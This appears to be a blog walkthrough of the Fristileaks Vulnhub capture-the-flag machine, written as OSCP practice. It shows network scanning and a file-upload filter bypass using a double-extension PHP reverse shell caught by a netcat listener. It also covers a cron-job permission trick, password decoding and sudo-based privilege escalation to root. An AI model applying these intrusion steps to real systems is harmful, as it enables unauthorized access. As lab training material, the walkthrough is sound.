---
title: Fristileaks Walkthrough
author: alex
date: Fri 28 Jul 19:15:48 CEST 2023
categories: [Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
img_path: /assets/img/posts/2023-07-28-fristileaks-walkthrough/
---

Today I'm hacking into **Fristileaks**. This is one of the many **beginner-friendly OSCP-like** CTFs of Vulnhub. So it's a great starting point for preparing the OSCP tests.

> SETUP
> 
> The setup is a bit tricky. I am using **VirtualBox**, and in order to get an IP for the VM, I had to manually change the MAC address of the machine to 080027A5A676.
{: .prompt-tip }

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining root access

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- Python/CyberChef

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.22.0/16   |   Screen View: Unique Hosts                                               
                                                                                                           
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1     08:00:27:2d:87:9b      1      60  PCS Systemtechnik GmbH                                          
192.168.1.41    08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH 
```
## Enumeration 

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.41
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-oscp-certification-guide/#port-scanning)**
{: .prompt-warning }

And the output...

```
PORT   STATE SERVICE VERSION

80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
```

Only **port 80** is open so let's open the browser and search the IP to see what we have.

![Fristileaks](/keep-calm.png)

Let's enumerate the directories of the website with `gobuster`: `sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.1.41 -t 10`. And we can see 3 directories not listed but present in *robots.txt*: beer, cola and sis. I didn't find anything interesting here. After drinking another coffee I started trying some words and one of them threw an interesting result: /fristi/.

Here we have a login page! If we have a look to the source code of the page we can find some interesting things:

![User](/eezeepz.webp)
![Password](/base64img.webp)

I guess that **eezeepz** is a username and the second string is base64. As soon as we try to decode it with **CyberChef** we can see it's a .png image. So we need to decode it as an image. And that image has a text in it: **keKkeKKeKKeKkEkkEk**.

Cool! That looks like a password. And sure it is. We are now presented with a page to upload a file. If we try to upload a reverse shell written in PHP with .php extension it gets rejected. Let's add .png to the extension: **reverse_shell.php.png**.

## Exploitation

Before we visit the url of our reverse shell, we must start a **Netcat** listener:

```bash
sudo nc -nlvp 1234
```

Now we can visit the url (IP + /uploads/reverse_shell.php.png) to start the shell and get inside **fristi**.

First, let's spawn an interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Good, let's start sniffing around the folders.

There's an interesting file: **/home/eezpeez/notes.txt**. If we `cat` it, we can see some instructions to run some commands as admins so we can change permissions for the *admin* directory:

```bash
echo '/home/admin/chmod -R 777 /home/admin' > /tmp/runthis
```

Now, after a minute, once the cronjob is executed we can `cd` into the *admin* directory. And here we can find some interesting files: 

- cryptpass.py
- whoisyourgodnow.txt
- cryptedpass.txt

We can see two passwords encrypted in the files **whoisyourgodnow.txt** and **cryptedpass.txt**. They have been encrypted with the file **cryptpass.py** so we have to reverse the encryption algorithm in order to revert it and reveal the password.

### Way #1 - CyberChef

If you are not good at Python or don't know how to write programs with it, you can use CyberChef for this task but you'll still need to understand some Python to know how the password is encrypted.

```python
     def encodeString(str):
1 >    base64string= base64.b64encode(str)
2 >    return codecs.encode(base64string[::1], 'rot13')
```

1. This line encodes the string in base64 as a first step so it will be our last step
2. This line rotates the characters 13 positions and reverse the string

So, inside CyberChef we need to load **Reverse**, **ROT13** and **From Base64**, paste the string and voilà! we have the password.

![CyberChef](/cyberchef.png)

### Way #2 - Python

If you are good with Python, you can code the reverse algorithm. Here's the program and how to use it:

```python
import base64,codecs,sys

string = "=RFn0AKnlMHMPIzpyuTI0ITG"

string1 = string[::-1]
string2 = string1.encode("rot13")
string3 = base64.b64decode(string2)

print string3
```

To use it: 

```bash
sudo python3 decryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
```

Now we can change user:

```bash
su fristigod
Password: LetThereBeFristi!
```

Let's see what powers do we have: `sudo -l`

```
User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

Cool! We can execute the doCom SUID with sudo privileges:

```bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
```

Now we can check we are root:

```
$ whoami
root
$ cd root
$ cat fristileaks_secrets.txt
```

And we get the flag as proof of our victory:

```
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
I wonder if you beat it in the maximum 4 hours it's supposed to take!
Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)

Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```


